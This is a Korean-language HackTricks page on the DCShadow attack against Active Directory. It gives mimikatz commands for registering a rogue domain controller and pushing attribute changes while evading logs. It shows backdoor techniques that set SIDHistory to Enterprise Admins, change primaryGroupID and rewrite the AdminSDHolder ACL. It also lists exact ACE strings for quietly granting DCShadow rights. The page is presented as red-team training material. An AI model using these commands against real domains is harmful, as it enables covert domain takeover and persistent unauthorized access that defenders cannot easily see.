{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# DCShadow

AD에 **새 도메인 컨트롤러**를 등록하고 이를 사용하여 지정된 객체에 **속성**(SIDHistory, SPNs...)을 **로그**를 남기지 않고 **푸시**합니다. **DA** 권한이 필요하며 **루트 도메인** 내에 있어야 합니다.\
잘못된 데이터를 사용하면 매우 불쾌한 로그가 나타날 수 있습니다.

공격을 수행하려면 2개의 mimikatz 인스턴스가 필요합니다. 하나는 SYSTEM 권한으로 RPC 서버를 시작하며(여기서 수행할 변경 사항을 지정해야 함), 다른 인스턴스는 값을 푸시하는 데 사용됩니다:

{% code title="mimikatz1 (RPC servers)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - DA 또는 유사 권한 필요" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

**`elevate::token`**는 `mimikatz1` 세션에서 작동하지 않음을 주의하세요. 이는 스레드의 권한을 상승시키지만, 우리는 **프로세스의 권한**을 상승시켜야 합니다.\
"LDAP" 객체를 선택할 수도 있습니다: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

DA 또는 최소한의 권한을 가진 사용자로부터 변경 사항을 푸시할 수 있습니다:

* **도메인 객체**에서:
* _DS-Install-Replica_ (도메인에서 복제본 추가/제거)
* _DS-Replication-Manage-Topology_ (복제 토폴로지 관리)
* _DS-Replication-Synchronize_ (복제 동기화)
* **구성 컨테이너**의 **사이트 객체** (및 그 자식들):
* _CreateChild and DeleteChild_
* **DC로 등록된 컴퓨터의 객체**:
* _WriteProperty_ (쓰기 아님)
* **대상 객체**:
* _WriteProperty_ (쓰기 아님)

[**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1)를 사용하여 비권한 사용자에게 이러한 권한을 부여할 수 있습니다 (이로 인해 일부 로그가 남게 됩니다). 이는 DA 권한을 가지는 것보다 훨씬 더 제한적입니다.\
예를 들어: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  이는 _**mcorp-student1**_ 머신에 로그인한 사용자 이름 _**student1**_이 객체 _**root1user**_에 대해 DCShadow 권한을 가지고 있음을 의미합니다.

## DCShadow를 사용하여 백도어 생성하기

{% code title="SIDHistory에 사용자로서 Enterprise Admins 설정" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="주 그룹 ID 변경 (사용자를 도메인 관리자 그룹의 구성원으로 추가)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="AdminSDHolder의 ntSecurityDescriptor 수정 (사용자에게 전체 제어 권한 부여)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - DCShadow 권한 부여하기 (수정된 권한 로그 없음)

다음 ACE를 사용자 SID와 함께 추가해야 합니다:

* 도메인 객체에서:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* 공격자 컴퓨터 객체에서: `(A;;WP;;;UserSID)`
* 대상 사용자 객체에서: `(A;;WP;;;UserSID)`
* 구성 컨테이너의 사이트 객체에서: `(A;CI;CCDC;;;UserSID)`

객체의 현재 ACE를 가져오려면: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

이 경우 **여러 변경을** 해야 한다는 점에 유의하세요, 단 하나의 변경만이 아닙니다. 따라서 **mimikatz1 세션** (RPC 서버)에서 변경하고자 하는 각 변경에 대해 **`/stack`** 매개변수를 사용하세요. 이렇게 하면 **`/push`**를 한 번만 수행하여 모든 스택된 변경을 악성 서버에서 수행할 수 있습니다.

[**DCShadow에 대한 더 많은 정보는 ired.team에서 확인하세요.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{% hint style="success" %}
AWS 해킹 배우고 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우고 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**

</details>
{% endhint %}
